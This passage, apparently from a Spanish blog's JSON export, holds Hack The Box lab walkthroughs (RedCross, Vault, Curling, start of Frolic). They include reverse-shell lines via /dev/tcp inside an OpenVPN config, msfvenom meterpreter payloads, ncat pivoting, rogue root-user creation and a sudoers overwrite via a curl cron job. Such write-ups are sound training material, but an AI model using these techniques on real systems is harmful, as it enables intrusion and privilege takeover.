nuestro propio usuario.\nUtilizando las mismas credenciales en la base de datos en la que se crean los usuarios, encontramos la tabla llamada passwd_table, que contiene:\n1 2 3 4 5 6 7 8 9  username | passwd | uid | gid | gecos | homedir | shell ---------------+------------------------------------+------+------+-------+----------------+----------- ...\t....\t...\t...\t....\t....\t... greater | $1$bRaICuCW$oRz.QUxie1yqP5Jbi3Z1v/ | 2022 | 0 | | /root | /bin/bash mailadm | $1$bRaICuCW$oRz.QUxie1yqP5Jbi3Z1v/ | 2024 | 1000 | | /home/penelope | /bin/bash slot | $1$Zjw7H894$4mUPW1tgQmV5QVKUIOeKZ/ | 2027 | 1001 | | /var/jail/home | /bin/bash shadow | $1$bRaICuCW$oRz.QUxie1yqP5Jbi3Z1v/ | 2029 | 42 | | /home/ | /bin/bash goku | $1$bRaICuCW$oRz.QUxie1yqP5Jbi3Z1v/ | 2033 | 27 | | /home/ | /bin/bash adm | $1$Ca4NB5YL$1VBlUqIoGQg.LSqbiZ7FY/ | 2034 | 4 | | /home/penelope | /bin/bash   Ya que el usuario unixusrmgr tiene permisos para insertar datos en esta tabla, podemos tomar ventaja e insertar nuestro propio usuario con permisos sudo a la base de datos, logearnos mediante ssh para luego poder crear y agregar un usuario con permisos(gid) root a la maquina.\n1 2  /usr/lib/postgresql/9.6/bin/psql -h 127.0.0.1 -U unixusrmgr unix Password: dheu%7wjx8B\u0026amp;   Para crear la contraseña utilizamos la siguiente pagina: https://es.functions-online.com/crypt.html\n1  $1$Ca4NB5YL$1VBlUqIoGQg.LSqbiZ7FY/:greatstuff   SQL - INSERT 1  insert into passwd_table(username, passwd, gid, homedir) values(\u0026#39;batman\u0026#39;, \u0026#39;$1$Ca4NB5YL$1VBlUqIoGQg.LSqbiZ7FY/\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;/root\u0026#39;);   Crear Usuario Sudo Update: ya que el usuario pertenece al grupo sudo esta ultima accion no era necesaria, basta con ejecutar sudo su.\n1 2 3  sudo useradd -ou 0 -g 0 happy sudo passwd happy su happy    Grant Root Access  Your browser does not support the video tag.  ","description":"En RedCross realizamos una enumeracion a un subdominos donde encontramos una funcion de la aplicacion web que nos permite crear un acceso temporal por SSH a una shell limitada, dentro de los parametros de esta accion descrita realizamos Command Inyeccion lo que nos dio acceso aun primer usuario. Finalmente tomamos ventaja de una funcionalidad de la aplicacion para agregar un usario y obtener acceso root.","id":154,"section":"posts","tags":["sqli","sqlmap","command injection","rce"],"title":"Hack The Box - RedCross","uri":"https://sckull.github.io/posts/redcross/"},{"content":"  En Vault obtuvimos acceso tras ejecutar una shell inversa en una web shell. Enumeramos la red para obtener acceso a una aplicacion donde ejecutamos una shell con una configuracion de OpenVPN. Finalmente encontramos nuestra flag root encriptada la cual obtuvimos utilizando una llave registrada en un usuario al que ya teniamos acceso.\n   Nombre Vault      OS Linux   Puntos 30   Dificultad Media   IP 10.10.10.109   Maker nol0gz    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[8.5, 8, 5.3, 4.7, 2], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[4, 10, 7, 3, 0], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     MASSCAN \u0026amp; NMAP Escaneo a todos los puertos UDP/TCP.\n1 2 3 4 5 6  Starting masscan 1.0.4 (http://bit.ly/14GZzcT) -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 22/tcp on 10.10.10.109 Discovered open port 80/tcp on 10.10.10.109   Escaneo a puertos 22, 80.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  Starting Nmap 7.70 ( https://nmap.org ) Nmap scan report for 10.10.10.109 Host is up (0.42s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a6:9d:0f:7d:73:75:bb:a8:94:0a:b7:e3:fe:1f:24:f4 (RSA) | 256 2c:7c:34:eb:3a:eb:04:03:ac:48:28:54:09:74:3d:27 (ECDSA) |_ 256 98:42:5f:ad:87:22:92:6d:72:e6:66:6c:82:c1:09:83 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 13.97 seconds   HTTP Puerto 80 http encontramos una pagina solo con el siguiente contenido, en el que anuncian a un nuevo cliente \u0026lsquo;Sparklays\u0026rsquo; pero su pagina (Sparklays.com) aun esta en construccion por lo que no puede ser accedida.\nAgregamos todas las palabras posibles del contenido de la pagina a un diccionario para gobuster utilizando cewl.\n1  cewl -w vault_custom.txt http://10.10.10.109/ \u0026amp;\u0026amp; tr \u0026#39;A-Z\u0026#39; \u0026#39;a-z\u0026#39; \u0026lt; vault_custom.txt \u0026gt; vault_lower.txt \u0026amp;\u0026amp; cat vault_custom.txt vault_lower.txt \u0026gt;\u0026gt; /usr/share/wordlist/dirb/common.txt   DIRBUSTER Utilizando dirbuster encontramos las siguientes rutas.\n/admin.php /login.php /design/design.html /design/changelogo.php /design/uploads/ SIMPLE PHP SHELL Para obtener una shell vamos a concentrarnos en changelogo.php es la unica ruta donde podemos subir archivos y considerando que, al subir un archivo se guarda en /uploads/ podremos ejecutar nuestro payload o comandos, para ello vamos a copiar un webshell que kali trae en su sistema.\nEnumerando los directorios nos encontramos con un archivo ssh que contiene el nombre de Dave y un aposible contraseña para el servicio ssh.\nSHELL - SSH Satisfactoriamente nos logeamos con las credenciales para el usuario dave.\nDentro de los archivos de dave encontramos dos archivos mas key y Servers.\nServers contiene IPs y el nombre que tiene cada una de ellas, y en key una \u0026ldquo;contraseña\u0026rdquo;, nmap no esta instalado en la maquina por lo que vamos a utilizar netcat para hacer un escaneo de los puertos de cada ip que nos aparece en el archivo Servers.\nNETCAT =\u0026gt; https://www.cyberciti.biz/faq/linux-port-scanning/\nDentro de las interfaces encontramos una interna en la cual nos identificamos con la ip 192.168.122.1.\nPrimero verificamos si hay mas de una IP disponible en un rango del 1 al 10.\nAhora sabemos que existen otras dos IP dentro de la interfaz virbr0 (192.168.122.5, 192.168.122.4) y por ahora solo tenemos acceso a una 192.168.122.1.\nEscaneo de puertos por IP\nPodemos observar que la IP 192.168.122.4 tiene dos puertos abiertos 80 y 22, mientras que la otra IP 192.168.122.5 netcat no encontro ningun puerto abierto pero si esta activa la direccion IP.\nTUNELING SSH Vamos a traer localmente la IP 192.168.122.4 y su puerto 80 a nuestra maquina, para poder analizar el puerto 80.\n1  ssh -L 9090:192.168.122.4:80 dave@10.10.10.109   Ejecutamos el comando localmente.\nRevisamos si el puerto esta a la escucha localmente.\nProcedemos a abrir 127.0.0.1:9090 en firefox para ver que contenido tiene.\n/DNS Settings Esta pagina no existe por lo que no encontramos nada.\n/VPN Configuration Al parecer es una pagina para modificar y executar archivo ovpn\nSHELL INVERSA - OVPN En https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da nos muestran como se puede realizar una shell inversa con las siguiente configuracion:\n1 2 3 4 5  remote 192.168.1.245 ifconfig 10.200.0.2 10.200.0.1 dev tun script-security 2 up \u0026#34;/bin/bash -c \u0026#39;/bin/bash -i \u0026gt; /dev/tcp/192.168.1.218/8181 0\u0026lt;\u0026amp;1 2\u0026gt;\u0026amp;1\u0026amp;\u0026#39;\u0026#34;   Como referencia para realizar una shell inversa tomamos la documentacion de openvpn (https://openvpn.net/community-resources/reference-manual-for-openvpn-2-4/) para realizar algunos cambios, y este es el resultado:\n1 2 3 4 5  remote 192.168.122.4 dev tun nobind script-security 2 up \u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.122.1/9999 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;   Ya que la IP donde esta corriendo la pagina es 192.168.122.4 vamos a obtener una shell inversa de esa maquina, por lo que en la maquina dave (192.168.122.1) vamos a poner a la escucha netcat y asi obtener nuestra shell.\nPresionamos Test VPN\nY obtenemos nuestra shell inversa\nY nuestra bandera USER\nDe igual forma encontramos un archivo ssh que contiene credenciales de lo que parece ser ssh para el usuario dave.\n1 2 3  SSH dave 192.168.122.4 dave dav3gerous567   Intentamos logearnos y satisfactoriamente tenemos acceso por medio de ssh a 192.168.122.4.\nNuestro progreso hasta ahora\nEnumerando dentro de 192.168.122.4 encontramos en el historial de comandos (.bash_history) una conexion a 192.168.5.2 por el puerto 987 utilizando netcat por el puerto local 5555, tambien un escaneo de nmap a esa misma ip.\nIntentamos hacer un escaneo a esa IP 192.168.5.2.\nDentro de la carpeta /var/www/DNS encontramos un archivo llamado interfaces, vemos que se han agregado nuevas rutas estaticas a la tabla de enrutamiento.\nLa ruta de destino que tenga 192.168.5.0 sera redirigido a la puerta de enlace 192.168.122.5 por medio de la interfaz ens3.\nTercera IP (192.168.5.2) ROOT - FLAG Vamos a utilizar el mismo comando que esta en el historial para poder conectarnos a 192.168.5.2.\n1  ncat -l 5555 --sh-exec \u0026#34;ncat 192.168.5.2 987 --source-port=4444\u0026#34; \u0026amp;   Obtenemos nuestra shell en 192.168.5.2 y nuestra bandera root pero esta encriptada y necesitamos una clave.\nNuestra tercer maquina Anteriormente habiamos encontrado un archivo key en 192.168.122.1 con una frase, para extraer la informacion de nuestra bandera encriptada vamos trasferir el archivo a donde esta la key.\nPara escapar de la shell utilizamos:\n1  find / -exec sh -i \\;   Trensferir root.txt.gpg Para transferir nuestro archivo vamos a hacer algo similar a lo que hicimos para la conexion ssh a 192.168.5.2.\n1  ncat -l 5555 --sh-exec \u0026#34;ncat 192.168.5.2 987 --source-port=4444\u0026#34; \u0026amp;   1  scp -P 5555 dave@192.168.122.4:/home/dave/root.txt.gpg .   Ahora necesitamos transferirlo a 192.168.122.1 donde esta nuestra key, codificamos root.txt.gpg en base64.\nDecodificamos el archivo.\nDesencriptamos con la frase que esta en el archivo key y obtenemos nuestra bandera root.\n","description":"En Vault obtuvimos acceso tras ejecutar una shell inversa en una web shell. Enumeramos la red para obtener acceso a una aplicacion donde ejecutamos una shell con una configuracion de OpenVPN. Finalmente encontramos nuestra flag root encriptada la cual obtuvimos utilizando una llave registrada en un usuario al que ya teniamos acceso.","id":155,"section":"posts","tags":["openvpn","cewl"],"title":"Hack The Box - Vault","uri":"https://sckull.github.io/posts/vault/"},{"content":"  Curling, encontramos credenciales tras enumerar Joomla y mediante una extension obtuvimos acceso a la maquina. Un pequeño reto nos permitio obtener una contraseña para realizar movimiento lateral. Para escalar privilegios se muestran dos formas, ejecutando el exploit Dirty Sock y modificando el archivo Sudoers mediante Curl y un CronJob.\n   Nombre Curling      OS Linux   Puntos 20   Dificultad Facil   IP 10.10.10.150   Maker L4mpje    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[6, 5.3, 5.1, 4.9, 4.7], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[7, 7, 7, 3, 3], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     MASSCAN \u0026amp; NMAP 1 2 3 4 5 6 7 8  root@sckull:~/htb/curling# masscan -p1-65535,U:1-65535 10.10.10.150 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 80/tcp on 10.10.10.150 Discovered open port 22/tcp on 10.10.10.150   Escaneo al puerto 80 y 22\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  Starting Nmap 7.70 ( https://nmap.org ) Nmap scan report for 10.10.10.150 Host is up (0.29s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA) | 256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA) |_ 256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-generator: Joomla! - Open Source Content Management |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Home Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running: Linux 2.6.X OS CPE: cpe:/o:linux:linux_kernel:2.6 OS details: Linux 2.6.18 - 2.6.22 Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 22/tcp) HOP RTT ADDRESS 1 707.63 ms 10.10.12.1 2 707.82 ms 10.10.10.150 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 26.56 seconds   HTTP 80 Al visitar la pagina en el puerto 80 encontramos una pagina sencilla con varios post, en donde tambien vemos el nombre de Floris y Super User que puede referirse a administrator.\nGOBUSTER Escaneo de directorios y archivos html, php y txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  root@sckull:~/htb/curling# gobuster -u http://10.10.10.150/ -w /usr/share/wordlists/dirb/common.txt -q -np -x html,php,txt -t 30 /administrator (Status: 301) /bin (Status: 301) /cache (Status: 301) /components (Status: 301) /configuration.php (Status: 200) /images (Status: 301) /includes (Status: 301) /index.php (Status: 200) /index.php (Status: 200) /language (Status: 301) /layouts (Status: 301) /libraries (Status: 301) /LICENSE.txt (Status: 200) /media (Status: 301) /modules (Status: 301) /plugins (Status: 301) /README.txt (Status: 200) /secret.txt (Status: 200) /server-status (Status: 403) /templates (Status: 301) /tmp (Status: 301) /web.config.txt (Status: 200)   Dentro de los directorios y archivos encontrados vemos uno no muy comun /secret.txt al visitar la direccion nos encontramos con una cadena en base64.\nAl decodificar dicha cadena nos devuelve Curling2018! posiblemente una contraseña para uno de los dos usuarios administrator y floris. Al intentar con el usuario floris y la contraseña en /secret.txt nos logramos logear al panel de administracion de joomla.\n1 2  Username: floris Password: Curling2018!   SHELL Ahora que tenemos acceso al panel de administracion podemos intentar obtener una shell mediante una extension mod_simplefileupload. Primero debemos de generar nuestro payload con msfvenom y poner a la escucha nuestra maquina con multi/handler.\n\nMetasploit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  root@sckull:~/htb/curling# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.12.11 LPORT=7878 -o batman.php [-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload [-] No arch selected, selecting arch: php from the payload No encoder or badchars specified, outputting raw payload Payload size: 1112 bytes Saved as: batman.php root@sckull:~/htb/curling# msfconsole -q msf5 \u0026gt; use exploit/multi/handler msf5 exploit(multi/handler) \u0026gt; set payload php/meterpreter/reverse_tcp payload =\u0026gt; php/meterpreter/reverse_tcp msf5 exploit(multi/handler) \u0026gt; set LHOST 10.10.12.11 LHOST =\u0026gt; 10.10.12.11 msf5 exploit(multi/handler) \u0026gt; set LPORT 7878 LPORT =\u0026gt; 7878 msf5 exploit(multi/handler) \u0026gt; exploit [*] Started reverse TCP handler on 10.10.12.11:7878   Para subir nuestra extension nos dirigmos a Extentions \u0026gt; Manage \u0026gt; Install \u0026gt; Upload Package File, elegimos nuestro paquete.\nLuego nos dirigimos a http://10.10.10.150/modules/mod_simplefileuploadv1.3/elements/udd.php, procedemos a subir nuestro payload y visitar la pagina donde se encuentra nuestro payload.\nY obtenemos nuestra sesion meterpreter.\nMetasploit - Sesion Meterpreter En la carpeta /home/floris encontramos el flag user.txt pero no tenemos permisos para leerlo, pero encontramos un archivo con el nombre de password_backup.\nUtilizamos xxd para verificar el archivo, al consulatar la firma de archivos encontramos que es un archivo de tipo bzip2.\n File Sigs  Utilizamos nuevamente xxd para escribir este archivo en /tmp.\n1  xxd -r /home/floris/password_backup \u0026gt; /tmp/backup.bz2   Pasamos nuestro archivo a base64 para poder extraerlo localmente.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  root@sckull:~/htb/curling# cat base64 | base64 -d \u0026gt; backup.bz2 root@sckull:~/htb/curling# bzip2 -d backup.bz2 root@sckull:~/htb/curling# ls backup base64 batman.php mod_simplefileuploadJ30v1.3.5.zip root@sckull:~/htb/curling# cat backup �l[password�r�BZh91AY\u0026amp;SY6Ǎ����@@!PtD�� t\u0026#34;d�hhOPIS@��6��8ET\u0026gt;P@�#I bՃ|3��x���������(*N�\u0026amp;�H��k1��x��\u0026#34;�{�ೱ��]��B@�6�m��root@sckull:~/htb/curling# file backup backup: gzip compressed data, was \u0026#34;password\u0026#34;, last modified: Tue May 22 19:16:20 2018, from Unix, original size 141 root@sckull:~/htb/curling# mv backup file.gz root@sckull:~/htb/curling# gunzip file.gz root@sckull:~/htb/curling# ls base64 batman.php file mod_simplefileuploadJ30v1.3.5.zip root@sckull:~/htb/curling# file file file: bzip2 compressed data, block size = 900k root@sckull:~/htb/curling# bzip2 -d file.bz2 root@sckull:~/htb/curling# ls base64 batman.php file mod_simplefileuploadJ30v1.3.5.zip root@sckull:~/htb/curling# cat file password.txt0000644000000000000000000000002313301066143012147 0ustar rootroot5d\u0026lt;wdCbdZu)|hChXll root@sckull:~/htb/curling# file file file: POSIX tar archive (GNU) root@sckull:~/htb/curling# tar xvf file password.txt root@sckull:~/htb/curling# cat password.txt 5d\u0026lt;wdCbdZu)|hChXll root@sckull:~/htb/curling#   Finalmente despues de pasar por varios archivos nos encontramos con una contraseña dentro del archivo password.txt, vamos a utilizarla para el usuario Floris en el servicio ssh y obtenemos nuestra bandera user.txt.\nPRIVILEGE ESCALATION Realizamos una enumeracion de posibles exploits con linux-exploit-suggester dentro del directorio /tmp, esto para facilitarnos una escalada de privilegios.\n Dirty Sock  Encontramos el CVE-2019-7304 de dirty_sock que podria ayudarnos para escalar privilegios, descargamos y ejecutamos nuestro exploit en /tmp, el cual nos creara un usario con privilegios root.\nCambiamos de usuario con su al usuario dirty_sock, y obtenemos privilegios root y la bandera root.txt.\nPRIVILEGE ESCALATION v2 Para esta Curling tenemos otra forma de obtener root, para ello utilizamos pspy para ver los cron que se ejecutan.\nObservamos que hay uno cronjob que ejecuta un comando el cual copia un archivo llamado default.txt a /home/floris/admin-area/input.\n1  cat /root/default.txt \u0026gt; /home/floris/admin-area/input   Y otro que hace uso de curl y mediante un archivo hace una consulta el cual lo guarda en report.\n1  curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report   Sabiendo lo anterior podemos crear un archivo sudoers que contenga permisos de usuario root para el usuario floris, utilizar un servidor local para que el cron haga la consulta, descargue el archivo y lo guarde en el archivo de sudoers.\nsudoers\nPython HTTP Server\nEditamos el archivo input con lo siguiente:\n1 2  url = \u0026#34;http://10.10.12.11/sudoers\u0026#34; output = \u0026#34;/etc/sudoers\u0026#34;   ","description":"Curling, encontramos credenciales tras enumerar Joomla y mediante una extension obtuvimos acceso a la maquina. Un pequeño reto nos permitio obtener una contraseña para realizar movimiento lateral. Para escalar privilegios se muestran dos formas, ejecutando el exploit Dirty Sock y modificando el archivo Sudoers mediante Curl y un CronJob.","id":156,"section":"posts","tags":["dirty_sock","metasploit","curl","cron","xxd"],"title":"Hack The Box - Curling","uri":"https://sckull.github.io/posts/curling/"},{"content":"  Frolic de HackTheboxk. Tras analizar el codigo fuente de la pagina web presenta multiples retos lo que nos llevo a unas credenciales que utilizamos en playSMS el cual explotamos una vulnerabilidad que nos dio acceso a la maquina. Para escalar privilegios expotamos un binario con privilegios SUID.\n   Nombre Frolic      OS Linux   Puntos 20   Dificultad Facil   IP 10.10.10.111   Maker felamos    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[6.2, 3.4, 5, 5, 6.6], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[6, 5, 7, 3, 5], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     MASSCAN \u0026amp; NMAP Realizamos un escaneo de puertos udp y tcp con masscan.\n1 2 3 4 5 6 7 8  masscan -p1-65535,U:1-65535 10.10.10.111 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 139/tcp on 10.10.10.111 Discovered open port 9999/tcp on 10.10.10.111   Escaneando el servicio que corre en los puertos encontrados con masscan.\n1 2 3 4 5 6 7 8 9 10 11  Starting Nmap 7.70 ( https://nmap.org ) Nmap scan report for 10.10.10.111 Host is up (1.0s latency). PORT STATE SERVICE VERSION 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 9999/tcp open http nginx 1.10.3 (Ubuntu) Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.19 seconds   SAMBA Un escaneo de puntos compartidos con smbclient, no encontramos mucho que nos pudiese ayudar.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  root@sckull:~# smbclient -L 10.10.10.111 Enter WORKGROUP\\root\u0026#39;s password: Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers IPC$ IPC IPC Service (frolic server (Samba, Ubuntu)) Reconnecting with SMB1 for workgroup listing. Server Comment --------- ------- Workgroup Master --------- ------- WORKGROUP FRIENDZONE   HTTP Un escaneo de rutas y archivos con gobuster al puerto 9999.\n1 2 3 4 5 6  root@sckull:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -u http://10.10.10.111:9999/ -q -np -x php,html,txt,js -t 15 /admin (Status: 301) /backup (Status: 301) /dev (Status: 301) /test (Status: 301) /playsms (Status: 301)   Dentro de la ruta /admin encontramos un panel de administracion que necesita un usuario y contraseña\nEn /backup encontramos password.txt y user.txt que contienen una contraseña y usuario respectivamente:\n1 2  passsword.txt -\u0026gt; password - imnothuman user.txt -\u0026gt; user - admin   En la ruta /dev y /loop no encontramos nada, dentro de /test informacion de la version de php corriendo en la maquina.\nFinalmente en /playsms encontramos un login:\nAdmin - Challenges Analizando el codigo de la ruta /admin encontramos que contiene un archivo de javascript llamado login.js:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Crack me :|\u0026lt;/title\u0026gt; \u0026lt;!-- Include CSS File Here --\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/style.css\u0026#34;/\u0026gt; \u0026lt;!-- Include JS File Here --\u0026gt; \u0026lt;script src=\u0026#34;js/login.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;main\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;c\u0026#39;mon i m hackable\u0026lt;/h2\u0026gt; \u0026lt;form id=\u0026#34;form_id\u0026#34; method=\u0026#34;post\u0026#34; name=\u0026#34;myform\u0026#34;\u0026gt; \u0026lt;label\u0026gt;User Name :\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34; id=\u0026#34;username\u0026#34;/\u0026gt; \u0026lt;label\u0026gt;Password :\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34; id=\u0026#34;password\u0026#34;/\u0026gt; \u0026lt;input type=\u0026#34;button\u0026#34; value=\u0026#34;Login\u0026#34; id=\u0026#34;submit\u0026#34; onclick=\u0026#34;validate()\u0026#34;/\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;span\u0026gt;\u0026lt;b class=\u0026#34;note\u0026#34;\u0026gt;Note : Nothing\u0026lt;/b\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   Y dentro de login.js encontramos una condicional que contiene un usuario y contraseña, tambien una redireccion hacia success.html:\n1 2  usuario: admin contraseña: superduperlooperpassword_lol   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  var attempt = 3; // Variable to count number of attempts. // Below function Executes on click of login button. function validate(){ var username = document.getElementById(\u0026#34;username\u0026#34;).value; var password = document.getElementById(\u0026#34;password\u0026#34;).value; if ( username == \u0026#34;admin\u0026#34; \u0026amp;\u0026amp; password == \u0026#34;superduperlooperpassword_lol\u0026#34;){ alert (\u0026#34;Login successfully\u0026#34;); window.location = \u0026#34;success.html\u0026#34;; // Redirecting to other page. return false; } else{ attempt --;// Decrementing by one. alert(\u0026#34;You have left \u0026#34;+attempt+\u0026#34; attempt;\u0026#34;); // Disabling fields after 3 attempts. if( attempt == 0){ document.getElementById(\u0026#34;username\u0026#34;).disabled = true; document.getElementById(\u0026#34;password\u0026#34;).disabled = true; document.getElementById(\u0026#34;submit\u0026#34;).disabled = true; return false; } } }   Dentro de success.html encontramos caracteres extraños:\ntilizando la pagina ook-language para decodificar lo anterior:\nNos muestra el mensaje: \u0026lsquo;Nothing here check /asdiSIAJJ0QWE9JAS\u0026rsquo; por lo que podria ser una ruta dentro de la pagina al visitar dicha ruta nos encontramos con lo siguiente:\n1 2 3 4 5 6 7  